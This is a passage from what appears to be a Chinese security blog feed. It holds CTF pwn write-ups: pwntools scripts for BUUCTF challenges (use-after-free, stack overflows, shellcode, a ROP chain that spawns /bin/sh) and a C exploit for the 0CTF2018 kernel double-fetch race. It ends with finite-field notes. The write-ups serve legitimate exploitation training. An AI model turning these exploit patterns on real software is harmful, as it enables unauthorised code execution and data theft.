&#125;</span><br></pre></td></tr></table></figure><p>通过分析add_note函数可知，最多分配5个chunk，每一个chunk有一个函数指针和一个存放字符串的buffer，函数指针固定指向print_note_content函数。不难想到通过UAF可以将函数指针修改为后门函数magic：</p><ul><li>首先分配两个chunk，字符串chunk的大小大于0x20</li><li>释放这两个chunk</li><li>分配第三个chunk，字符串chunk大小为0x20，这样第三个chunk的字符串chunk和第一个chunk位置相同，修改其函数指针调用即可。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25067</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printc</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;colin&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>, p32(<span class="number">0x8048945</span>) + p32(<span class="number">0</span>))</span><br><span class="line">printc(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h1 id="buu043-picoctf-2018-buffer-overflow-1"><a href="#buu043-picoctf-2018-buffer-overflow-1" class="headerlink" title="buu043-picoctf_2018_buffer overflow 1"></a>buu043-picoctf_2018_buffer overflow 1</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25573</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">40</span>+<span class="number">4</span>) + p32(<span class="number">0x80485CB</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu044-jarvisoj-test-your-memory"><a href="#buu044-jarvisoj-test-your-memory" class="headerlink" title="buu044-jarvisoj_test_your_memory"></a>buu044-jarvisoj_test_your_memory</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27588</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">19</span>+<span class="number">4</span>) + p32(<span class="number">0x8048440</span>) + p32(<span class="number">0x80487E0</span>)*<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu045-mrctf2020-shellcode"><a href="#buu045-mrctf2020-shellcode" class="headerlink" title="buu045-mrctf2020_shellcode"></a>buu045-mrctf2020_shellcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26987</span>)</span><br><span class="line">io.sendline(asm(shellcraft.amd64.sh()))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu046-inndy-rop"><a href="#buu046-inndy-rop" class="headerlink" title="buu046-inndy_rop"></a>buu046-inndy_rop</h1><p>首先把’&#x2F;bin&#x2F;sh’写到bss段然后系统调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;, 25928)</span></span><br><span class="line">int80 = <span class="number">0x806C943</span></span><br><span class="line">popeax_ret = <span class="number">0x80B8016</span></span><br><span class="line">popebx_edx_ret = <span class="number">0x806ECD9</span></span><br><span class="line">popecx_ret = <span class="number">0x80DE769</span></span><br><span class="line">addesp0x14_ret = <span class="number">0x807A75D</span></span><br><span class="line">bss = <span class="number">0x80EBFD4</span></span><br><span class="line">read = <span class="number">0x806D290</span></span><br><span class="line">payload = cyclic(<span class="number">12</span> + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read)<span class="comment"># call read()</span></span><br><span class="line">payload += p32(addesp0x14_ret)<span class="comment"># return address, add esp to execute latter ROP</span></span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># arg #1 of read(): stdin</span></span><br><span class="line">payload += p32(bss)<span class="comment"># arg #2 of read(): a bss address</span></span><br><span class="line">payload += p32(<span class="number">0x8</span>)<span class="comment"># arg #3 of read(): read length</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p32(popeax_ret)<span class="comment"># eax = 0x11(SYS_EXECVE)</span></span><br><span class="line">payload += p32(<span class="number">11</span>)</span><br><span class="line">payload += p32(popebx_edx_ret)</span><br><span class="line">payload += p32(bss)<span class="comment"># ebx = &#x27;/bin/sh&#x27;</span></span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># edx = 0</span></span><br><span class="line">payload += p32(popecx_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># ecx = 0</span></span><br><span class="line">payload += p32(int80)<span class="comment"># int 80</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel pwn 入门 (5)</title>
      <link href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-5/"/>
      <url>/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-5/</url>
      
        <content type="html"><![CDATA[<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>在用户态pwn中有一类题型叫做条件竞争。当程序需要在不同时刻访问相同一块内存时，如果没有做好并发访问的限制和检查，就有可能会产生恶意数据或执行恶意代码。今天笔者就来分析一下内核态中的条件竞争，以一道经典的题辅助学习。</p><h1 id="0CTF2018-baby（double-fetch）"><a href="#0CTF2018-baby（double-fetch）" class="headerlink" title="0CTF2018-baby（double fetch）"></a>0CTF2018-baby（double fetch）</h1><h2 id="Step-1-分析程序与调试"><a href="#Step-1-分析程序与调试" class="headerlink" title="Step 1: 分析程序与调试"></a>Step 1: 分析程序与调试</h2><p>按照惯例，打开IDA。<br><img src="https://img-blog.csdnimg.cn/e7047afbb0d7497f8300c571445a1582.png"><br>这个模块实现的功能只有一个：ioctl。我们跟进到其调用的ioctl_impl函数看一下。<br><img src="https://img-blog.csdnimg.cn/5303f6ef46de4a32ba173dd55789e8d4.png"><br>ioctl的指令码只有两种：0x6666和0x1337。当指令码为0x6666时，会打印出flag的地址。<br>当指令码为0x1337时，其会调用_chk_range_not_ok函数。一看名字就不难猜测，这是一个检查越界的函数：<br><img src="https://img-blog.csdnimg.cn/c6b5819ea1fc4add968768a9a0ba9ba4.png"><br>上面的__CFADD__函数的功能是返回两个参数相加后的CF标志位。当两个参数相加在最高位产生进位时CF为1，否则为0。不难想到如果a1和a2相加产生进位，那么一定会导致越界溢出。传入的第三个参数应该是数组的末尾地址，后面要判断a1+a2是否大于v4。</p><p>回到ioctl_impl函数，这里判断传入的第三个参数不能大于<code>*(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x1358)</code>这个东西。那这个东西到底是多少呢，我们写一个简单的程序调用一下这个模块看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-23.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, main);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    <span class="type">char</span> b[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不知道是什么原因，本题的内核没有办法直接下断点，也没有办法将断点下在用户态程序中。尝试了很长时间，才找到调试的方法：</p><h3 id="重要：内核模块调试方法："><a href="#重要：内核模块调试方法：" class="headerlink" title="重要：内核模块调试方法："></a>重要：内核模块调试方法：</h3><p>首先打开init文件，将权限改为root（即在启动sh的那一行把gid从1000改成0），然后启动内核输入lsmod命令获取到模块的加载地址。然后我们<strong>不用去管syscall到底调用了模块的什么函数，不用去管这个函数在什么地方，直接将断点下在输出的加载地址上。注意，其输出的地址是模块加载的起始地址，但依然可以发挥断点的作用。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # lsmod</span><br><span class="line">baby 16384 0 - Live 0xffffffffc02f8000 (OE)</span><br></pre></td></tr></table></figure><p>如上面的输出，我们可以直接将断点下在0xffffffffc02f8000，而无需在其上加上ioctl函数的偏移，也可以起到断点的作用。（亲测有效）</p><p>通过这种方式，我们成功调试漏洞模块，然后找到了<code>*(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x1358)</code>的值到底是多少：0x7ffffffff000。这是用户态栈区的最高地址，因此只要我们传入的是一个不太大的地址，都是可以的。<br><img src="https://img-blog.csdnimg.cn/e00e1f4520c14f25a8ed3a7081c2183c.png"><br>再回去看一下反汇编，注意第一个检查中的第一个参数cmpStr应该是一个指针，而第二个检查中的第二个参数应该表示字符串的长度，这里是将地址的值和第二个参数相加，因此不难猜测。即使猜不出来，第三个检查应该就非常明显了，检查这里的值是否等于flag的长度。flag的长度为33。因此我们要传入的参数应该是一个结构体的地址，这个结构体的前8字节是一个char*指针，后面8字节是33。<br><img src="https://img-blog.csdnimg.cn/f93aadf8db39412ca658af074d21fa9c.png"><br>在判断之后，会对传入的字符串进行检查，如果与flag相等则输出flag。这里就产生了竞争条件漏洞。</p><p><font color=red><strong>如果在进行if判断的时候，我们的地址传入的是正常的用户态地址，而在执行后面的字符串比较时，这个地址就被改变到了flag处，会怎么样呢？显然模块会用flag去比较其自身，这样显然是相等的。然后flag就能够被输出。如果我们使用双线程，就可以和内核模块竞争字符串地址这块内存的访问。只要能够在这个时间窗口成功修改字符串地址，后面的检查就可以通过。因此简单点说，竞争条件就是“时间的活”。</strong></font></p><p>在C语言中，我们使用pthread_create函数创建一个线程，可以让一个线程执行一个函数。具体的参数调用规则参见<a href="https://blog.csdn.net/wushuomin/article/details/80051295?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165858376216782391822691%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165858376216782391822691&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-80051295-null-null.142%5Ev33%5Econtrol,185%5Ev2%5Econtrol&utm_term=pthread_create&spm=1018.2226.3001.4187">资料</a>。</p><p>因此我们写出exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-23.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">msg</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* buffer;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;msg;</span><br><span class="line"><span class="type">size_t</span> flag_address;</span><br><span class="line"><span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_TIME 1000</span></span><br><span class="line">msg m;</span><br><span class="line"><span class="type">pthread_t</span> competition_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">competition</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!success)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;WRITE_TIME; i++)</span><br><span class="line">            m.buffer = flag_address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep &#x27;flag&#x27; &gt; temp.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> file = open(<span class="string">&quot;/temp.txt&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">char</span> context[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(file, context, <span class="number">49</span>);</span><br><span class="line">    flag_address = strtoull(context + <span class="number">31</span>, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">    close(file);</span><br><span class="line"></span><br><span class="line">    m.buffer = context;</span><br><span class="line">    m.length = <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;competition_thread, <span class="literal">NULL</span>, competition, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span>(!success)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;WRITE_TIME; i++)&#123;</span><br><span class="line">            m.buffer = context;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;m);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;dmesg | grep &#x27;flag&#x27; &gt; temp.txt&quot;</span>);</span><br><span class="line">        file = open(<span class="string">&quot;/temp.txt&quot;</span>, O_RDWR);</span><br><span class="line">        read(file, context, <span class="number">0x80</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(context, <span class="string">&quot;flag&#123;&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">            success = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, context);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中在规划两者竞争的时候需要注意应该如何写代码，我们应该让二者充分竞争，所以双方修改这一个地方的总次数最好不要相差太多，否则可能难以达到竞争的目的。<br><img src="https://img-blog.csdnimg.cn/52944e2a49444a7483022b8c38567c9d.png"><br>由此可见，本题中竞争条件的利用并不是很难，难就难在当我们拿到这一题时，我们应该怎样才能够发现这道题存在条件竞争漏洞。本题的条件竞争属于double fetch，它通常的流程是：检查代码首先访问某一块内存，确认数据没有问题后主要操作代码再一次访问同一块内存，显然当这块内存没有被上锁的情况下，中间的时间空当是可以被利用的，这种检查也是线程不安全的。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息安全数学基础 Chapter 3——有限域（一）</title>
      <link href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Chapter-3-有限域"><a href="#Chapter-3-有限域" class="headerlink" title="Chapter 3 有限域"></a>Chapter 3 有限域</h1><p><font color=blue>定义3.1</font> 设$\mathbb F$为一个非空集合，在其上定义两种运算：加法和乘法，这两种运算在集合上封闭，且满足下列条件：</p><ol><li>$\mathbb F$中所有元素对于加法形成加法交换群</li><li>$\mathbb F$中所有非零元素（记为$\mathbb F^*$）对于乘法构成乘法交换群</li><li>任意$\mathbb F$中元素满足乘法对加法的交换律（与实数集中的交换律形式上相同）</li></ol><p>则称$\mathbb F$对于规定的乘法和加法构成一个域。<br><font color=red>一个域至少有两个元素：加法群零元（称为域的零元，$0$）和乘法单位元（称为域的单位元，$e$）</font>。域元素个数有限称为有限域或伽罗华域，否则称为无限域。有理数集合$\mathbb Q$和复数集合$\mathbb C$按定义的加法和乘法均为域</p><hr><p><font color=blue>定义3.2</font> 设$\mathbb F$是一个域，$\mathbb F_0$是$\mathbb F$的非空子集，如果对于$\mathbb F$上的加法和乘法，$\mathbb F_0$本身也是一个域，则称$\mathbb F_0$是$\mathbb F$的子域，$\mathbb F$是$\mathbb F_0$的扩域，记作$\mathbb F_0\subsetneq\mathbb F$</p><hr><p><font color=purple>定理3.1</font> 设$\mathbb F_0$，$\mathbb F_0^*$均是域$\mathbb F$的非空子集，当且仅当下面两个条件成立时$\mathbb F_0$是$\mathbb F$的子域：</p><ol><li>对于任意$a, b\in \mathbb F_0$，都有$-a, a+b\in\mathbb F_0$</li><li>对于任意非零元素$a, b\in\mathbb F_0$，都有$a^{-1}, ab\in\mathbb F_0$</li></ol><p><font color=dblue>证明方法：</font>需要证明$\mathbb F_0$是$\mathbb F$的加法子群，$\mathbb 